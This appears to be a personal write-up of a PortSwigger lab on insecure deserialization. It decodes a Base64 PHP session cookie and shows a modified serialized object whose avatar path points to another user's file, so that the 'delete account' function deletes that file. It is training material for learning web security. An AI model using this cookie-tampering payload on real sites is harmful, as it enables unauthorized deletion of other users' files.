
# Table of Contents

1.  [What is serialization ?](#org1e61ffa)
        1.  [Serialization vs Deserialization](#org19c1f71)
2.  [Deserialized object](#org8968ffe)
3.  [Customized object](#orgb9fc66e)



<a id="org1e61ffa"></a>

# What is serialization ?

Serialization is the process of converting complex data structures, such as objects and their fields, into a &ldquo;flatter&rdquo; format that can be sent and received as a sequential stream of bytes.

Crucially, when serializing an object, its state is also persisted. In other words, the object&rsquo;s attributes are preserved, along with their assigned values.


<a id="org19c1f71"></a>

### Serialization vs Deserialization

Deserialization is the process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized.

The website&rsquo;s logic can then interact with this deserialized object, just like it would with any other object.


<a id="org8968ffe"></a>

# Deserialized object

-   Edit the serialized object in the session cookie
-   Delete files from Carlos home directory

Lab ->  <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization>

-   Credentials:
    
    wiener:peter

---

-   At web page lab, CTRL + SHIFT + i to open `dev tools`
    -   Get the sessions cookie at `dev tools`
        Application > storage > Cookies
    -   The cookie are Base64 encode, at terminal ->

---

    echo 'Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJoaG5sYWJzZzlpcW1kNTMycXRya3h5eXRxNHQzMXhiYiI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30=' | base64 -d

-   And we get an deserialized Object ->
    O:4:&ldquo;User&rdquo;:3:{s:8:&ldquo;username&rdquo;;s:6:&ldquo;wiener&rdquo;;s:12:&ldquo;access<sub>token</sub>&rdquo;;s:32:&ldquo;hhnlabsg9iqmd532qtrkxyytq4t31xbb&rdquo;;s:11:&ldquo;avatar<sub>link</sub>&rdquo;;s:19:&ldquo;users/wiener/avatar&rdquo;;}

O -> Object
s -> String
s:3 -> string lenght
; -> separator

-   We can modify that object, encode base64 again, and send to web page at our original cookie place, with `dev tools`


<a id="orgb9fc66e"></a>

# Customized object

-   Customize the user home path at cookie to carlos /home directory
    O:4:&ldquo;User&rdquo;:3:{s:8:&ldquo;username&rdquo;;s:6:&ldquo;wiener&rdquo;;s:12:&ldquo;access<sub>token</sub>&rdquo;;s:32:&ldquo;hhnlabsg9iqmd532qtrkxyytq4t31xbb&rdquo;;s:11:&ldquo;avatar<sub>link</sub>&rdquo;;s:23:&ldquo;/home/carlos/morale.txt&rdquo;;}
    
    Now when click at delete account func, the deleted account will be carlos account
    
    !

